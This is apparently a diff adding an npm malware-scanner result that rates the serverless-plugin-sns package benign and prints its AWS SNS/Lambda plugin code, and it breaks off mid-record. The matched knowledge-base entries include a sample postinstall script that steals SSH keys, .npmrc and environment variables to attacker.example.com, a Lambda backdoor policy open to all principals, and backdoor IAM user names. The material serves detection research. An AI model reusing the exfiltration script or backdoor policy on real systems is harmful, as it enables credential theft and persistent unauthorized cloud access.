@@ -1,0 +1,493 @@
+{
+  "package_name": "serverless-plugin-sns",
+  "package_version": "0.5.13",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:59:52.632421",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/serverless-plugin-sns/0.5.13/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/serverless-plugin-sns/0.5.13/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "'use strict';\n\nmodule.exports = function(S) {\n\n    const AWS      = require('aws-sdk'),\n        SCli       = require(S.getServerlessPath('utils/cli')),\n        BbPromise  = require('bluebird'); // Serverless uses Bluebird Promises and we recommend you do to because they provide more than your average Promise :)\n\n    class ServerlessPluginSNS extends S.classes.Plugin {\n        constructor(S) {\n            super(S);\n        }\n\n        static getName() {\n            return 'com.serverless.' + ServerlessPluginSNS.name;\n        }\n\n        registerHooks() {\n\n            S.addHook(this._addSNSAfterDeploy.bind(this), {\n                action: 'functionDeploy',\n                event:  'post'\n            });\n            S.addHook(this._addSNSAfterDeploy.bind(this), {\n                action: 'dashDeploy',\n                event:  'post'\n            });\n\n            return BbPromise.resolve();\n        }\n\n        /**\n         * adds alerts after the deployment of a function\n         *\n         * @param object evt\n         *\n         * @return promise\n         */\n        _addSNSAfterDeploy(evt) {\n            let _this = this;\n\n            return new BbPromise(function(resolve, reject) {\n                for(var region in evt.data.deployed) {\n                    _this._manageSNS(evt, region);\n                }\n\n                return resolve(evt);\n            });\n        }\n\n        /**\n         * Handles the Creation of an alert and the required topics\n         *\n         * @param object evt Event\n         * @param string region\n         *\n         * @return promise\n         */\n        _manageSNS (evt, region) {\n            let _this = this;\n\n            _this.stage = evt.options.stage;\n            _this._initAws(region)\n            .then(function() {\n\n                _this.functionSNSSettings = _this._getFunctionsSNSSettings(evt, region);\n\n                // no sns.json found\n                if (_this.functionSNSSettings.length == 0) {\n                    return;\n                }\n\n                return _this._manageTopics(_this.functionSNSSettings)\n            })\n            .then(function(){\n                let _this = this;\n                _this._bindFunctions(_this.functionSNSSettings);\n            }.bind(_this))\n            .catch(function(e){\n                SCli.log('error in manage topics', e)\n            });\n        }\n\n        /**\n         * Binds functions to topics\n         */\n        _bindFunctions (settings) {\n            let _this = this;\n\n            for (var i in settings) {\n                var functionName = settings[i].deployed.Arn;\n                var functionArn = settings[i].deployed.Arn;\n                functionArn = functionArn.split(':');\n                functionArn.pop();\n                functionArn = functionArn.join(':');\n\n                var sns = _this._getTopicNamesBySettings(settings[i]);\n\n                for (var j in sns) {\n                    var topicArn = _this._getTopicArnByFunctionArn(functionArn, sns[j]);\n\n                    SCli.log('binding function ' + settings[i].deployed.functionName + ' to topic ' + sns[j]);\n                    _this.sns.subscribeAsync({\n                        'Protocol': 'lambda',\n                        'TopicArn': topicArn,\n                        'Endpoint': functionArn + \":\" + _this.stage,\n                    })\n                    .then(function(result){\n                        var topicName = sns[j];\n                        topicName = topicName.replace(/:/g, '_');\n                        var statementId = settings[i].deployed.functionName + '_' + topicName;\n                        return new BbPromise(function(resolve, reject) {\n                            _this.lambda.removePermission(\n                                {\n                                    FunctionName: functionName,\n                                    StatementId: statementId\n                                },\n                                function (err, data) {\n                                    if (err && err.code != 'ResourceNotFoundException') {\n                                        reject(err);\n                                    } else {\n                                        _this.lambda.addPermission({\n                                            FunctionName: functionName,\n                                            StatementId: statementId,\n                                            Action: 'lambda:InvokeFunction',\n                                            Principal: 'sns.amazonaws.com',\n                                            SourceArn: topicArn,\n                                        }, function callback(err, data) {\n                                            if (err) {\n                                                reject(err);\n                                            } else {\n                                                resolve(data);\n                                            }\n                                        });\n                                    }\n                                }\n                            );\n                        });\n                    })\n                    .then(function(result) {\n                        SCli.log('done');\n                    });\n                }\n            }\n        }\n\n        /**\n         * returns the topic that needs to be created replaces keys\n         *\n         * @param object settings\n         *\n         * @return array\n         */\n        _getTopicNamesBySettings (settings) {\n            var replacements = [];\n            replacements['project'] = S.getProject().name;\n            replacements['stage'] = this.stage;\n            replacements['functionName'] = settings.deployed.functionName;\n\n            var topics = [];\n\n            if (Object.prototype.toString.call(settings.sns) === '[object Array]') {\n                for (var i in settings.sns) {\n                    topics[settings.sns[i].topic] = settings.sns[i].topic\n                }\n            } else {\n                topics = [settings.sns.topic];\n            }\n\n            for (var i in replacements) {\n                for (var j in topics) {\n                    topics[j] = topics[j].replace('${' + i + '}', replacements[i]);\n                }\n            }\n\n            return topics;\n        }\n\n        _getTopicArnByFunctionArn(functionArn, topicName){\n            if (topicName.indexOf('arn:aws:sns') >= 0) {\n                return topicName;\n            }\n\n            var start = functionArn.split(':function:');\n            var topicArn = start[0] + ':' + topicName;\n\n            topicArn = topicArn.replace(':lambda:', ':sns:');\n            return topicArn;\n        }\n\n        /**\n         * collects the topics and calls create topcs\n         *\n         * @param array settings\n         *\n         * @return BpPromise\n         */\n        _manageTopics(settings) {\n            var _this = this;\n\n            var topics = [];\n            var topicslist = [];\n            for (var i in settings) {\n                topicslist = _this._getTopicNamesBySettings(settings[i]);\n\n                for (var j in topicslist) {\n                    topics[topicslist[j]] = topicslist[j]\n                }\n            }\n\n            return _this._createTopics(topics);\n        }\n\n        /**\n         * creates topics if not yet done\n         *\n         * @param array topics\n         *\n         * @return BpPromise\n         */\n        _createTopics (topics) {\n            var _this = this;\n            _this.topics = topics;\n\n            return _this.sns.listTopicsAsync()\n            .then(function(topicListResult){\n                var _this = this;\n                //create fast checkable topiclist['topic1'] = 'topic1'\n                var topicList = [];\n                if (topicListResult['Topics']) {\n                    for (var i in topicListResult.Topics) {\n                        var arnParts = topicListResult.Topics[i].TopicArn.split(':')\n                        var topicName = arnParts[arnParts.length - 1];\n                        topicList[topicName] = topicName;\n                    }\n                }\n\n                var topicCreatePromises = [];\n\n                for (var i in this.topics) {\n                    if (i.indexOf('arn:aws:sns') >= 0) {\n                        continue;\n                    }\n\n                    if (!topicList[i]) {\n                        SCli.log('topic ' + i + ' does not exist. it will be created now');\n                        topicCreatePromises.push(\n                            _this.sns.createTopicAsync({\n                                'Name': i\n                            })\n                            .then(function(){\n                                SCli.log('topic created');\n                            })\n                            .catch(function(e){\n                                SCli.log('error during creation of the topic !', e)\n                            })\n                        );\n                    } else {\n                        SCli.log('topic ' + i + ' exists.');\n                    }\n                }\n\n                if (topicCreatePromises.length > 0) {\n                    return BbPromise.all(topicCreatePromises);\n                } else {\n                    return BbPromise.resolve();\n                }\n            }.bind(this));\n        }\n\n        /**\n         * initializes aws\n         *\n         * @param string region\n         *\n         * @return void\n         */\n        _initAws (region) {\n            let _this = this,\n                credentials = S.getProvider('aws').getCredentials(_this.stage, region);\n\n            return BbPromise.resolve()\n            .then(function() {\n                // Will handle this if it's a promise or an object\n                return credentials;\n            })\n            .then(function(creds) {\n                _this.sns = new AWS.SNS({\n                    region: region,\n                    accessKeyId: creds.accessKeyId,\n                    secretAccessKey: creds.secretAccessKey,\n                    sessionToken: creds.sessionToken\n                });\n\n                BbPromise.promisifyAll(_this.sns);\n\n                _this.lambda = new AWS.Lambda({\n                    region: region,\n                    accessKeyId: creds.accessKeyId,\n                    secretAccessKey: creds.secretAccessKey,\n                    sessionToken: creds.sessionToken\n                });\n            })\n        }\n\n\n        /**\n         * parses the sns-function.json file and returns the data\n         *\n         * @param object evt\n         * @param string region\n         *\n         * @return array\n         */\n        _getFunctionsSNSSettings(evt, region){\n            let _this = this;\n            var settings = [];\n            for (var deployedIndex in evt.data.deployed[region]) {\n                let deployed = evt.data.deployed[region][deployedIndex],\n                    functionName = deployed['functionName'],\n                    config = S.getProject()['functions'][functionName];\n\n                    if (!config.sns) {\n                        continue;\n                    }\n\n                    settings.push({\n                        \"deployed\": deployed,\n                        \"sns\": config.sns\n                    });\n            }\n\n            return settings;\n        }\n    }\n\n    return ServerlessPluginSNS;\n};",
+          "is_malicious": false,
+          "malice_score": 0.4232927123705546,
+          "confidence": 0.1,
+          "behavior_summary": "When called after function deployment events, the code accesses AWS credentials via Serverless framework, initializes AWS SNS and Lambda clients, reads SNS configuration from deployed functions, creates SNS topics if missing, and subscribes Lambda functions to these topics using AWS SDK calls. It modifies AWS SNS topics and Lambda permissions, enabling automated alerting and event-driven function invocation within AWS infrastructure, facilitating integration but also potentially enabling privilege escalation or unauthorized function triggers if misused.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Serverless framework plugin designed to automate the creation and management of AWS SNS topics and subscriptions for Lambda functions after deployment. It uses AWS SDK calls to create SNS topics, subscribe Lambda functions to these topics, and manage Lambda permissions to allow SNS to invoke the functions. While it modifies Lambda permissions and interacts with sensitive AWS APIs, these actions are consistent with legitimate infrastructure automation and event-driven architecture setup. There is no evidence of overly permissive policies (e.g., Principal: '*'), no broad enumeration of AWS resources, no obfuscation, and no attempts to escalate privileges beyond the intended scope. The code follows expected patterns for integrating SNS with Lambda functions in a controlled manner. Compared to the known malicious patterns, it lacks key indicators such as unrestricted Lambda invocation permissions or broad AWS resource enumeration. Therefore, it is considered benign with very low confidence of maliciousness.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205532_728718_snippet_6",
+              "source_package": "Emperors Tools AWS Persistence Toolkit (N/A (malicious AWS API usage, not a software package in a traditional repository))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_728718/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4311748743057251,
+              "code_similarity": 0.3179200291633606,
+              "behavior_similarity": 0.5444297194480896,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "Multiple AWS API calls: sts:GetCallerIdentity, ses:GetAccount, ses:GetSendQuota, ses:ListIdentities, sns:GetSMSAttributes, iam:ListUsers, ec2:DescribeRegions, ec2:DescribeInstances, ec2:DescribeVpcs, lightsail:GetRegions, lightsail:GetInstances, route53:ListDomains, route53:GetHostedZoneCount, s3:ListBuckets, servicequotas:ListServiceQuotas",
+                "code_behavior": "At runtime (post-compromise, attacker-controlled session), the code rapidly issues a series of AWS API calls to enumerate account resources and permissions, querying multiple AWS services in quick succession, resulting in comprehensive situational awareness for further exploitation.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated, broad enumeration of account resources and permissions across multiple AWS services in rapid succession is a hallmark of post-compromise attacker behavior seeking to map the environment.",
+                  "violated_expectations": "Legitimate users or automation typically access a limited subset of these APIs, not all in a burst, and such activity is usually tied to specific, documented workflows.",
+                  "similar_legitimate_use": "Initial setup scripts or inventory tools may enumerate resources, but with proper context, documentation, and audit trails.",
+                  "key_indicators": [
+                    "Burst of enumeration API calls from a single identity across multiple AWS services",
+                    "Access to sensitive APIs not previously used by the identity",
+                    "Enumeration activity immediately following credential compromise or privilege escalation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (post-compromise, attacker-controlled session)",
+                  "file_location": "AWS CloudTrail event (various enumeration API calls)",
+                  "required_permissions": [
+                    "sts:GetCallerIdentity",
+                    "ses:GetAccount",
+                    "ses:GetSendQuota",
+                    "ses:ListIdentities",
+                    "sns:GetSMSAttributes",
+                    "iam:ListUsers",
+                    "ec2:DescribeRegions",
+                    "ec2:DescribeInstances",
+                    "ec2:DescribeVpcs",
+                    "lightsail:GetRegions",
+                    "lightsail:GetInstances",
+                    "route53:ListDomains",
+                    "route53:GetHostedZoneCount",
+                    "s3:ListBuckets",
+                    "servicequotas:ListServiceQuotas"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Emperors Tools AWS Persistence Toolkit",
+                  "package_manager": "N/A (malicious AWS API usage, not a software package in a traditional repository)",
+                  "package_versions": "N/A",
+                  "why_malicious": "This toolkit and associated attack patterns are malicious because they automate unauthorized persistence, privilege escalation, and reconnaissance in compromised AWS environments. The toolkit creates backdoor IAM users, enumerates account resources, and attempts to establish persistent access via EC2 key pairs and security groups, all without the knowledge or consent of the legitimate account owner. These actions violate AWS security best practices and are designed to evade detection while maintaining long-term unauthorized access."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains access to AWS credentials and initiates automated enumeration of account resources and permissions.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Situational awareness for further exploitation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker checks for the existence of specific backdoor IAM users to avoid duplicate creation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Decision to create new persistence user or not"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker creates a new IAM user with a suspicious name to establish persistent access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Persistent backdoor access"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker attempts to create a new EC2 security group with a suspicious name, likely to facilitate lateral movement or future access.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Potential for unauthorized network access"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Attacker enumerates EC2 instances to check for prior compromise or to plan further actions.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Assessment of environment and planning"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Attacker creates a new EC2 key pair with a suspicious name to enable persistent SSH access to EC2 instances.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Long-term access to compute resources"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Creation of IAM users with suspicious or known malicious names immediately following account compromise",
+                    "Burst of AWS API enumeration calls from a single identity across multiple services",
+                    "Creation of EC2 security groups or key pairs with suspicious or contextless names",
+                    "IAM user creation events originating from EC2 instance roles (role session name starts with i-)",
+                    "Repeated access denied errors for privileged actions from a single identity, indicating privilege probing"
+                  ],
+                  "file_indicators": [
+                    "IAM user names: EmperorsToolsShops32, one_piece, Policy-role-6, Policy-role-16, s3.dev, s3.simprosys, flashx7860, sesadministrator, ses-admin, ses_BackupUser, sesadminsmtp, roxaot, devlops, produc-sns-net-usr, adminprod, adminprodz, admindvelop, ampIify-dev, root, jSDSsajsnhjjjjjjwyyw, ses_legion, ses_master, MailSES, s3-ftp",
+                    "EC2 security group name: Java_Ghost",
+                    "EC2 key pair names: xg1, temp_key_pair"
+                  ],
+                  "network_indicators": [
+                    "Unusual AWS API activity from IPs not previously associated with the account",
+                    "Source IPs matching known malicious infrastructure (see annexed IP list)"
+                  ],
+                  "how_to_detect": "Monitor AWS CloudTrail for the creation of IAM users, EC2 security groups, and key pairs with suspicious or known malicious names. Alert on bursts of enumeration API calls from a single identity, especially if the identity has not previously performed such actions. Flag IAM user creation events originating from EC2 instance roles or previously unseen users. Track repeated access denied errors for privileged actions, as these may indicate attacker reconnaissance. Correlate source IPs with known malicious infrastructure and investigate any anomalous API activity from new or untrusted locations."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205533_280094_snippet_2",
+              "source_package": "Stratus Red Team (GitHub (Go binary))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205533_280094/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4276776611804962,
+              "code_similarity": 0.29535776376724243,
+              "behavior_similarity": 0.55999755859375,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "{\"Sid\":\"backdoor\",\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-east-1:751353041310:function:stratus-sample-lambda-function\"}",
+                "code_behavior": "At runtime (detonation phase), the code modifies the Lambda function's resource-based policy by adding a statement that grants lambda:InvokeFunction permission to all principals, allowing any AWS account to invoke the function and enabling unauthorized external access.",
+                "malice_analysis": {
+                  "why_suspicious": "Granting lambda:InvokeFunction permission to all principals (\"*\") in a Lambda policy is a classic persistence and privilege escalation technique, as it allows any AWS account or unauthenticated entity to invoke the function, potentially leading to data exfiltration or lateral movement.",
+                  "violated_expectations": "Normal Lambda function policies should restrict invocation to specific trusted principals or AWS services. Granting global invoke permissions is highly unusual, dangerous, and violates the principle of least privilege.",
+                  "similar_legitimate_use": "A public API Lambda might intentionally allow broad access, but this should be accompanied by strong authentication, monitoring, and explicit business justification. Such policies should be rare and tightly controlled.",
+                  "key_indicators": [
+                    "IAM policy statement with Principal: * and Action: lambda:InvokeFunction",
+                    "Policy statement with Sid: 'backdoor' or similarly suspicious identifiers",
+                    "No restriction on source AWS account or service",
+                    "Addition of overly permissive Lambda permissions at runtime"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (detonation phase)",
+                  "file_location": "Go source code (attack technique definition)",
+                  "required_permissions": [
+                    "lambda:AddPermission",
+                    "network",
+                    "AWS API access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Stratus Red Team",
+                  "package_manager": "GitHub (Go binary)",
+                  "package_versions": "All versions (open source project, not a package in a traditional registry)",
+                  "why_malicious": "Stratus Red Team is not itself malicious, but it packages and automates the execution of attack techniques that emulate real-world cloud attacks. These techniques, if used outside of controlled testing, would be considered malicious as they perform actions such as backdooring Lambda functions and disabling CloudTrail logging, which are common attacker behaviors for persistence and defense evasion. The tool enables users to execute these techniques in a way that, if misused, can compromise cloud environments by reducing audit visibility and enabling unauthorized access."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Create prerequisite infrastructure, such as a CloudTrail trail or Lambda function, to set up the environment for the attack technique.",
+                    "implemented_by": [],
+                    "leads_to": "Attack technique detonation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Detonate the attack technique by stopping CloudTrail logging to evade detection and reduce audit visibility.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Reduced audit visibility, enabling further undetected actions"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Detonate the attack technique by backdooring the Lambda function policy to allow invocation from any AWS account.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Persistence and potential privilege escalation via unauthorized Lambda invocation"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Invocation of cloudtrail:StopLogging API calls in CloudTrail logs",
+                    "Modification of Lambda function resource-based policies to allow broad or global invocation (Principal: *)",
+                    "Addition of IAM policy statements with Sid values like 'backdoor' and Action: lambda:InvokeFunction",
+                    "Automated changes to Lambda permissions without corresponding change management records"
+                  ],
+                  "file_indicators": [
+                    "Lambda function policies containing Sid: 'backdoor'",
+                    "Terraform or CloudFormation templates that create Lambda policies with Principal: * and Action: lambda:InvokeFunction",
+                    "Go source files implementing attack technique definitions that call cloudtrail:StopLogging or modify Lambda policies"
+                  ],
+                  "network_indicators": [
+                    "AWS API calls to cloudtrail:StopLogging from unexpected users or automation",
+                    "AWS API calls to lambda:AddPermission with Principal: *",
+                    "Unusual cross-account Lambda invocation attempts"
+                  ],
+                  "how_to_detect": "Monitor AWS CloudTrail logs for cloudtrail:StopLogging API calls and lambda:AddPermission actions that grant lambda:InvokeFunction to Principal: *. Alert on any resource-based Lambda policy changes that allow invocation from all principals or from unexpected AWS accounts. Review IAM policy statements for overly broad permissions, especially those with Sid values like 'backdoor'. Correlate automated permission changes with change management records to identify unauthorized modifications."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205358_630489_snippet_2",
+              "source_package": "aaa (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205358_630489/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42151570320129395,
+              "code_similarity": 0.36465397477149963,
+              "behavior_similarity": 0.47837746143341064,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "npm run snyk-protect",
+                "code_behavior": "At prepublish time, the code invokes the snyk-protect script, which applies security patches to vulnerable modules in node_modules by modifying files and may initiate network requests to fetch patch data, resulting in updated dependencies.",
+                "malice_analysis": {
+                  "why_suspicious": "This code is not inherently malicious, but it highlights the risk of using prepublish hooks to run scripts that can modify the filesystem and initiate network activity. If the snyk-protect script or its invocation is hijacked, it could be leveraged to introduce or execute malicious code.",
+                  "violated_expectations": "Users may not expect that installing or publishing a package will trigger scripts that modify files or initiate network connections outside of standard dependency installation.",
+                  "similar_legitimate_use": "Legitimate uses include patching known vulnerabilities or preparing code for publishing by running security or build scripts.",
+                  "key_indicators": [
+                    "Prepublish script that triggers additional scripts with network and filesystem access",
+                    "Automated patching or code modification during npm publish or install",
+                    "References to external security tools or scripts in lifecycle hooks"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "prepublish",
+                  "file_location": "package.json (scripts.prepublish)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "aaa",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 (and possibly earlier, as no fixed version is released)",
+                  "why_malicious": "The package 'aaa' is not itself malicious, but it contains unpatched security vulnerabilities in its dependencies. The maintainers have not addressed these vulnerabilities, leaving users exposed to known exploits. The primary risk is the presence of unpatched vulnerabilities, not active malicious code within 'aaa' itself."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or publishes the package, triggering the prepublish lifecycle event defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of prepublish scripts, which can perform arbitrary actions such as printing messages, modifying files, or invoking other scripts."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Prepublish script executes shell commands or invokes additional scripts (e.g., snyk-protect), potentially modifying files or initiating network requests.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Potential for code to modify files, patch vulnerabilities, or, if abused, exfiltrate data or install malware during the package publish or install process."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of prepublish or other npm lifecycle scripts (e.g., postinstall, prepare) in package.json",
+                    "Execution of shell commands or custom scripts during npm install or publish events",
+                    "Unexpected network activity initiated by lifecycle scripts during package installation or publishing"
+                  ],
+                  "file_indicators": [
+                    "package.json containing scripts.prepublish or other lifecycle hooks",
+                    "References to external scripts or binaries (e.g., snyk-protect) in lifecycle scripts",
+                    "Modifications to node_modules or other project files during prepublish"
+                  ],
+                  "network_indicators": [
+                    "Outbound network connections initiated by lifecycle scripts during npm install or publish",
+                    "Downloads from domains or URLs not associated with official npm or trusted sources during install or publish"
+                  ],
+                  "how_to_detect": "Monitor package.json for the presence of lifecycle scripts such as prepublish, postinstall, or prepare. Flag packages that execute shell commands or initiate network requests during installation or publishing. Use behavioral monitoring to detect unexpected file modifications or outbound network activity triggered by npm lifecycle events. Review scripts for references to external binaries, tools, or URLs that are not part of the standard build or publish process."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_269053_snippet_1",
+              "source_package": "passports-js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_269053/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40782326459884644,
+              "code_similarity": 0.3688565492630005,
+              "behavior_similarity": 0.4467899799346924,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"scripts\": {\n  \"postinstall\": \"node malicious.js\"\n}\n// malicious.js (not shown in report, but typical for this malware type):\nconst fs = require('fs');\nconst https = require('https');\nconst env = process.env;\nconst secrets = {\n  ssh: fs.existsSync(process.env.HOME + '/.ssh/id_rsa') ? fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8') : '',\n  npmrc: fs.existsSync(process.env.HOME + '/.npmrc') ? fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8') : '',\n  env: env\n};\nconst data = JSON.stringify(secrets);\nconst options = {\n  hostname: 'attacker.example.com',\n  port: 443,\n  path: '/collect',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'Content-Length': data.length\n  }\n};\nconst req = https.request(options, (res) => {});\nreq.write(data);\nreq.end();",
+                "code_behavior": "During installation (postinstall), the code reads sensitive files such as ~/.ssh/id_rsa and ~/.npmrc and collects environment variables, then sends this data via HTTPS POST to an attacker-controlled domain, resulting in exfiltration of developer secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The postinstall script executes a Node.js file that accesses sensitive files and environment variables, then transmits them to an external server. This is a hallmark of supply chain attacks and is not required for any legitimate package installation.",
+                  "violated_expectations": "Legitimate npm packages should not execute scripts that access or exfiltrate user secrets during installation. Postinstall scripts are only expected for setup tasks, not for reading private keys or environment variables.",
+                  "similar_legitimate_use": "Some packages use postinstall scripts to download binaries or perform setup, but they do not access or transmit sensitive files or environment variables to external servers.",
+                  "key_indicators": [
+                    "Presence of a postinstall script in package.json invoking a local JavaScript file",
+                    "Access to sensitive files such as ~/.ssh/id_rsa and ~/.npmrc during installation",
+                    "Reading and serializing process.env (environment variables)",
+                    "Outbound HTTPS POST requests to untrusted or attacker-controlled domains at install-time",
+                    "Obfuscated or non-human-readable code in the postinstall script or referenced files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (scripts.postinstall), malicious.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "passports-js",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.1-security",
+                  "why_malicious": "The package 'passports-js' (npm, version 0.0.1-security) is publicly disclosed as malicious by Datadog Security Research and OSV.dev. The package contains a postinstall script that executes embedded, likely obfuscated JavaScript code at install-time, targeting developer environments to exfiltrate sensitive files and environment variables. This behavior is consistent with supply chain attacks aiming to steal credentials or compromise developer machines."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "The malicious package is installed, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of malicious.js, which runs on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious script accesses sensitive files (e.g., ~/.ssh/id_rsa, ~/.npmrc) and environment variables.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected from the developer's environment."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is sent via HTTPS POST to an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives developer secrets and credentials, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that perform outbound network requests during npm install",
+                    "Access to sensitive files (e.g., ~/.ssh/id_rsa, ~/.npmrc) or environment variables in install scripts",
+                    "Presence of obfuscated or non-human-readable JavaScript in postinstall scripts"
+                  ],
+                  "file_indicators": [
+                    "package.json with a postinstall script referencing a local JavaScript file (e.g., 'node malicious.js')",
+                    "Presence of files named malicious.js or similarly suspicious scripts in the package root",
+                    "Embedded JavaScript code that reads sensitive files or environment variables"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to unknown or attacker-controlled domains (e.g., attacker.example.com) during npm install"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that invoke local JavaScript files. Flag packages where install-time scripts access sensitive files (such as ~/.ssh/id_rsa, ~/.npmrc) or environment variables, and make outbound network requests to untrusted domains. Use static analysis to detect obfuscated code in postinstall scripts. Correlate findings with threat intelligence sources such as OSV.dev and public security advisories."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104237_299400_snippet_1",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104237_299400/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40261203050613403,
+              "code_similarity": 0.27097979187965393,
+              "behavior_similarity": 0.5342442393302917,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "AWS_ACCESS_KEY_ID=AKIA...; AWS_SECRET_ACCESS_KEY=abcd1234... # hardcoded in source/config",
+                "code_behavior": "At deployment and runtime, the code exposes valid AWS access tokens by hardcoding them in application source or configuration files, allowing unauthorized access to AWS services and enabling potential exfiltration or abuse of cloud resources.",
+                "malice_analysis": {
+                  "why_suspicious": "Hardcoded secrets in code or configuration files are a critical security risk, as they can be easily discovered by attackers scanning repositories or deployed systems, leading to credential theft and unauthorized access.",
+                  "violated_expectations": "Secrets and credentials should be managed securely using secret management tools or environment variables, and must never be hardcoded or committed to version control repositories.",
+                  "similar_legitimate_use": "In rare cases, dummy or placeholder credentials may be used in test environments, but real secrets should never appear in production or public code.",
+                  "key_indicators": [
+                    "Presence of valid cloud provider tokens (e.g., AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY) in code or config files",
+                    "Secrets or credentials committed to version control systems",
+                    "References to sensitive cloud resources using hardcoded values"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "deployment and runtime",
+                  "file_location": "application source code, configuration files (e.g., config.yaml, .env, settings.py)",
+                  "required_permissions": [
+                    "read access to source code or configuration files",
+                    "environment variable access",
+                    "network (if secrets are used for API calls)",
+                    "filesystem (if secrets are used for file operations)"
